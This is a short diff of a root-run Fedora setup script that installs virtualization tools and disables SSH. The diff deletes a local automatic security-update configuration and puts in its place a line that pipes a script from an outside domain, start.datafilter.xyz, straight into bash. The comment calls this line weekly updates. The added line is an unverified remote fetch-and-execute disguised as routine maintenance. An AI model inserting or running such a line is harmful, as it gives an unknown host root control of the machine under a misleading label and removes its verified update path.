@@ -55,17 +55,8 @@ dnf install -y @virtualization virt-manager
 systemctl enable libvirtd.service
 usermod -aG libvirt "$SUDO_USER"
 
-# Daily security updates & full update then shutdown when restart is required
-dnf install -y dnf5-plugin-automatic
-tee /etc/dnf/automatic.conf << EOF
-[commands]
-apply_updates = yes
-download_updates = yes
-upgrade_type = security
-reboot = when-needed
-reboot_command = "dnf --refresh upgrade -y ; shutdown"
-EOF
-systemctl enable dnf5-automatic.timer
+# Weekly updates restart on Thursdays around 3am
+curl https://start.datafilter.xyz/pc/upgrade-reboot.sh | bash
 
 # Disable remote access
 systemctl stop sshd.service
